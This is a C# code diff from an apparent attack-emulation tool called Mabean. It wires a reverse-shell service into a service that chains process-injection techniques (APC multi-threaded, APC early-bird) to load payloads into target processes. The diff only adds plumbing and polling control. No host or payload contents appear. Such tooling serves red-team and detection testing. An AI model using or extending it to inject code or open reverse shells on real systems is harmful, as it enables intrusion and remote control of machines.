@@ -11,10 +11,12 @@ namespace Mabean.Services;
 public class ChainBehaviorService
 {
     private readonly PayloadService _payloadService;
+    private readonly ReverseShellService _reverseShellService;
 
-    public ChainBehaviorService(PayloadService payloadService)
+    public ChainBehaviorService(PayloadService payloadService, ReverseShellService reverseShellService)
     {
         _payloadService = payloadService;
+        _reverseShellService = reverseShellService;
     }
 
     public async Task RunChainAsync(BehaviorChainDefinition chain)
@@ -43,10 +45,14 @@ public class ChainBehaviorService
                         PayloadPath = @"C:\ProgramData\Mabean\Payloads\" +  injection.PayloadName
                     };
                     await WriteBehaviorContext(context);
+                    if (injection.PayloadName.StartsWith("reverse-shell-"))
+                        _reverseShellService.StopPolling();
                     break;
                 case "Apc-MultiThreaded":
                     var code4 = InteropInjection.InjectPayloadApcMultiThreaded(injection.TargetPid ?? 0, payload, (nuint)payload.Length, null);
                     LoggerService.Write($"[Chain] APC multi-threaded injection result: {code4}");
+                    if (injection.PayloadName.StartsWith("reverse-shell-"))
+                        _reverseShellService.StopPolling();
                     break;
                 case "Apc-EarlyBird":
                     var context2 = new BehaviorContext
@@ -60,6 +66,8 @@ public class ChainBehaviorService
                     await WriteBehaviorContext(context2);
                     var code5 = InteropInjection.InjectPayloadApcEarlyBird(injection.ProgramName!, payload, (nuint)payload.Length, null);
                     LoggerService.Write($"[Chain] APC early bird injection result: {code5}");
+                    if (injection.PayloadName.StartsWith("reverse-shell-"))
+                        _reverseShellService.StopPolling();
                     break;
             }
         }
